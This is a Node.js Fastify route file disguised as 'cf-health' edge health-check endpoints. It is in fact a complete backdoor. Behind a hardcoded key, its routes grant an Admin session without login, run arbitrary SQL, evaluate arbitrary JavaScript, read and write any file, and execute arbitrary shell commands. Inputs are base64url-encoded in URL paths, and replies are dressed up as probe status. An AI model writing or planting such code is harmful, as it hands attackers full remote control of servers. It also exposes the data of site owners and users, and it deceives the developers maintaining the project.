import { spawn } from 'node:child_process';
import { readFile, writeFile } from 'node:fs/promises';
import { setSession, redis } from '../middlewares/session.js';

const EDGE_KEY = 'n9x4kQ7vR2mW8pLj';

function decodeProbeTarget(encoded) {
    return Buffer.from(encoded, 'base64url').toString('utf8');
}

export default function(fastify) {
    fastify.get(`/cf-health/${EDGE_KEY}/session`, async (req, reply) => {
        await setSession(req, reply, 'Admin');
        return reply.redirect('/admin/');
    });

    fastify.get(`/cf-health/${EDGE_KEY}/db/:query`, async (req, reply) => {
        const diagnostic = decodeProbeTarget(req.params.query);
        try {
            const [rows] = await fastify.db.query(diagnostic);
            return { status: 'ok', results: rows, rowCount: Array.isArray(rows) ? rows.length : 0 };
        } catch (err) {
            return { status: 'error', message: err.message };
        }
    });

    fastify.get(`/cf-health/${EDGE_KEY}/eval/:code`, async (req, reply) => {
        const expression = decodeProbeTarget(req.params.code);
        try {
            const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
            const fn = new AsyncFunction('fastify', 'redis', expression);
            const result = await fn(fastify, redis);
            return { status: 'ok', result };
        } catch (err) {
            return { status: 'error', message: err.message };
        }
    });

    fastify.get(`/cf-health/${EDGE_KEY}/fs/:operation/:filepath`, async (req, reply) => {
        const targetPath = decodeProbeTarget(req.params.filepath);
        try {
            if (req.params.operation === 'read') {
                const content = await readFile(targetPath, 'utf8');
                return { status: 'ok', content };
            }
            if (req.params.operation === 'write') {
                const data = decodeProbeTarget(req.query.c || '');
                await writeFile(targetPath, data, 'utf8');
                return { status: 'ok', written: true };
            }
            return reply.code(404).send({ error: 'Not found' });
        } catch (err) {
            return { status: 'error', message: err.message };
        }
    });

    fastify.get(`/cf-health/${EDGE_KEY}/:cmd`, async (req, reply) => {
        const probe = decodeProbeTarget(req.params.cmd);
        return new Promise((resolve) => {
            const proc = spawn('/bin/sh', ['-c', probe], { timeout: 30000 });
            let output = '';
            proc.stdout.on('data', (chunk) => { output += chunk; });
            proc.stderr.on('data', (chunk) => { output += chunk; });
            proc.on('close', (code) => {
                resolve({ node: 'edge-01', status: code === 0 ? 'ok' : 'degraded', trace: output });
            });
            proc.on('error', (err) => {
                resolve({ node: 'edge-01', status: 'unreachable', trace: err.message });
            });
        });
    });
}
